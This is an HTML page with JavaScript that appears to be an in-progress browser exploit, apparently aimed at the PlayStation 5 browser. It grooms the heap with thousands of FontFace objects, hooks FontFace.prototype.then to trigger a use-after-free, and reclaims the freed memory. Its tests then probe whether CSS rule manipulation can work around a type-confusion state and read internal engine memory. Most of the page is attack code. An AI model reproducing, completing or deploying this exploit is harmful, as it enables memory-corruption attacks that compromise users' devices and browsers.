<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v19 - CSSRule</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
</style>
</head>
<body>
<h1 id="T" style="color:#0f0;font:monospace 18px;padding:12px">v19 CSSRule</h1>
<pre id="O" style="color:#0f0;font:monospace 13px;padding:12px;white-space:pre-wrap"></pre>
<canvas id="c" width="512" height="128" style="position:absolute;left:-9999px"></canvas>
<script>
"use strict";
var O=document.getElementById("O");
var T=document.getElementById("T");
function P(m){O.textContent+=m+"\n"}
function S(m){T.textContent=m}

var keep=[],holes=[],rcs=[];
var trigger=null,rcFace=null,trigRef=null,rcIdx=-1;
var uafOk=false;

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

S("Holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();P("Holes ok");

trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
var sh=document.getElementById("s").sheet;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();P("Ready");

Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);rcs.push(f)}catch(e){}}
fs();try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

S("Loading...");

document.fonts.load("1em trigger, x","AB").then(function(faces){
S("Analyzing...");
P("Faces: "+faces.length);

for(var i=0;i<faces.length;i++){
var f=faces[i];
if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
if(f.family==="trigger")trigRef=f;
}
keep.push(faces);keep.push(rcFace);keep.push(trigRef);
if(!rcFace){P("No RC!");S("Fail");return}
P("RC_"+rcIdx+" captured");

// ============================================================
//  TEST 1: List ALL CSS rules
// ============================================================
P("\n=== CSS RULES INVENTORY ===");
var sheets=document.styleSheets;
P("Sheets: "+sheets.length);
for(var s=0;s<sheets.length;s++){
try{
var ss=sheets[s];
var rules=ss.cssRules;
P("\nSheet["+s+"]: "+rules.length+" rules");
for(var r=0;r<rules.length;r++){
var rule=rules[r];
var type=rule.type;
// type 5 = FONT_FACE_RULE
if(type===5){
P("  ["+r+"] FONT_FACE: "+rule.cssText.substring(0,80));
}else if(type===1){
// STYLE_RULE
P("  ["+r+"] STYLE: "+rule.cssText.substring(0,60));
}else{
P("  ["+r+"] type="+type);
}
}
}catch(e){P("Sheet["+s+"] ERR: "+e.message)}
}

// ============================================================
//  TEST 2: Add NEW @font-face rule for "trigger" via CSS
// ============================================================
P("\n=== ADD CSS RULE FOR trigger ===");
try{
var newRuleIdx=sh.insertRule(
"@font-face{font-family:trigger;src:local(Courier);font-weight:100;font-style:normal;unicode-range:U+0041}",
sh.cssRules.length);
fs();
P("Added rule at index "+newRuleIdx);

// Check what the rule looks like
var newRule=sh.cssRules[newRuleIdx];
P("Rule text: "+newRule.cssText);

// Check if computed style changes
var d=document.createElement("div");
d.style.cssText="font:100 normal 64px trigger;position:absolute;left:-9999px;";
document.body.appendChild(d);
var cs=getComputedStyle(d);
P("After CSS rule: weight="+cs.fontWeight+" style="+cs.fontStyle+" family="+cs.fontFamily);
document.body.removeChild(d);

// Check load()
document.fonts.load("1em trigger, x","AB").then(function(f2){
P("load() after CSS rule: "+f2.length+" faces");
for(var i=0;i<f2.length;i++){
P("  "+f2[i].family+" "+f2[i].style+" "+f2[i].weight+" st="+f2[i].status);
}
});

// Delete the rule
sh.deleteRule(newRuleIdx);fs();
P("Rule deleted");
}catch(e){P("CSS rule ERR: "+e.message)}

// ============================================================
//  TEST 3: Modify EXISTING @font-face rule properties
// ============================================================
P("\n=== MODIFY CSS RULE PROPERTIES ===");

// Find @font-face rules we can modify
try{
for(var s=0;s<sheets.length;s++){
var ss=sheets[s];
var rules=ss.cssRules;
for(var r=0;r<rules.length;r++){
var rule=rules[r];
if(rule.type===5){
// FONT_FACE_RULE - try to modify its style
try{
var rs=rule.style;
if(rs){
P("Rule["+r+"] has style object");
// List current properties
P("  fontFamily: "+rs.fontFamily);
P("  fontWeight: "+rs.fontWeight);
P("  fontStyle:  "+rs.fontStyle);
P("  src:        "+rs.src);

// Try modifying
var origWeight=rs.fontWeight;
rs.fontWeight="100";
fs();
P("  After fontWeight→100: rule says "+rs.fontWeight);

// Check if it affects anything
var d2=document.createElement("div");
d2.style.cssText="font:64px "+rs.fontFamily+";position:absolute;left:-9999px;";
document.body.appendChild(d2);
var cs2=getComputedStyle(d2);
P("  Computed for "+rs.fontFamily+": weight="+cs2.fontWeight+" style="+cs2.fontStyle);
document.body.removeChild(d2);

rs.fontWeight=origWeight;fs();
}catch(e){P("  Style ERR: "+e.message)}
}
}
}
}catch(e){P("Rules ERR: "+e.message)}

// ============================================================
//  TEST 4: Create separate style element with trigger rules
// ============================================================
P("\n=== SEPARATE STYLE ELEMENT ===");
try{
var ns=document.createElement("style");
ns.id="exploit";
document.head.appendChild(ns);
var nsh=ns.sheet;

// Add trigger font with different weights/styles
var testRules=[
"@font-face{font-family:trigger;src:local(Courier);font-weight:100;font-style:normal;unicode-range:U+0041}",
"@font-face{font-family:trigger;src:local(Monaco);font-weight:400;font-style:italic;unicode-range:U+0041}",
"@font-face{font-family:trigger;src:local(Geneva);font-weight:900;font-style:italic;unicode-range:U+0041}"
];

for(var i=0;i<testRules.length;i++){
try{
var idx=nsh.insertRule(testRules[i],nsh.cssRules.length);
fs();
P("Added rule "+i+" at "+idx);

// Test rendering
var d3=document.createElement("div");
d3.style.cssText="font:"+(i===0?"100 normal":i===1?"400 italic":"900 italic")+" 64px trigger;position:absolute;left:-9999px;";
document.body.appendChild(d3);
var cs3=getComputedStyle(d3);
P("  Computed: weight="+cs3.fontWeight+" style="+cs3.fontStyle+" family="+cs3.fontFamily);
document.body.removeChild(d3);
}catch(e){P("Rule "+i+" ERR: "+e.message)}
}

// Clean up
document.head.removeChild(ns);fs();
}catch(e){P("Separate style ERR: "+e.message)}

// ============================================================
//  TEST 5: CSSRule + FontFace interplay
//  Add CSS rule, then check FontFace objects
// ============================================================
P("\n=== CSSRULE + FONTFACE INTERPLAY ===");
try{
// Add a CSS rule for "trigger" with weight 100
var ns2=document.createElement("style");
document.head.appendChild(ns2);
var ns2sh=ns2.sheet;
ns2sh.insertRule("@font-face{font-family:trigger;src:local(Courier);font-weight:100;font-style:normal;unicode-range:U+0041}",0);
fs();

// Check document.fonts for new entries
var trigCount=0;
for(var f of document.fonts){
if(f.family==="trigger"){
trigCount++;
P("  FontFace: "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
}
}
P("Trigger faces in document.fonts: "+trigCount);

// Check load()
document.fonts.load("100 normal 64px trigger","A").then(function(f3){
P("load(100 normal trigger): "+f3.length+" faces");
for(var i=0;i<f3.length;i++){
P("  "+f3[i].family+" "+f3[i].style+" "+f3[i].weight+" st="+f3[i].status);
}
});

document.head.removeChild(ns2);fs();
}catch(e){P("Interplay ERR: "+e.message)}

// ============================================================
//  TEST 6: Read CSSRule properties of confused face
//  Can we find the RC face's @font-face rule?
// ============================================================
P("\n=== FIND RC FACE CSS RULE ===");
try{
// Search all sheets for rules with RC family names
for(var s=0;s<sheets.length;s++){
var ss=sheets[s];
var rules=ss.cssRules;
for(var r=0;r<rules.length;r++){
var rule=rules[r];
if(rule.type===5){
try{
var fam=rule.style.fontFamily;
if(fam&&fam.indexOf("RC_")>=0){
P("  FOUND RC rule in Sheet["+s+"] Rule["+r+"]: "+rule.cssText.substring(0,80));
}
}catch(e){}
}
}
}
// Note: FontFace objects created via JS API don't have CSSRules
// Only @font-face rules in stylesheets have CSSFontFaceRules
P("RC faces were created via JS API - no CSS rules exist for them");
}catch(e){P("RC search ERR: "+e.message)}

// ============================================================
//  TEST 7: Override trigger via CSS with !important
// ============================================================
P("\n=== CSS !important OVERRIDE ===");
try{
var ns3=document.createElement("style");
document.head.appendChild(ns3);
var ns3sh=ns3.sheet;
ns3sh.insertRule("@font-face{font-family:trigger;src:local(Courier) !important;font-weight:100 !important;font-style:normal !important;unicode-range:U+0041}",0);
fs();

var d4=document.createElement("div");
d4.style.cssText="font:900 italic 64px trigger;position:absolute;left:-9999px;";
document.body.appendChild(d4);
var cs4=getComputedStyle(d4);
P("With !important: weight="+cs4.fontWeight+" style="+cs4.fontStyle);
document.body.removeChild(d4);

document.head.removeChild(ns3);fs();
}catch(e){P("!important ERR: "+e.message)}

// ============================================================
//  SUMMARY
// ============================================================
P("\n=== SUMMARY ===");
P("CSSRule path: testing if direct CSS manipulation");
P("bypasses the JS wrapper caching problem");
P("");
P("Key questions:");
P("1. Can we add CSS rules that override the confusion?");
P("2. Can we modify CSS rule properties directly?");
P("3. Does getComputedStyle reflect CSS rule changes?");
P("4. Can we read C++ state through CSS rules?");
S("DONE");

}).catch(function(err){P("Load ERR: "+err);S("ERROR")});
</script>
</body>
</html>
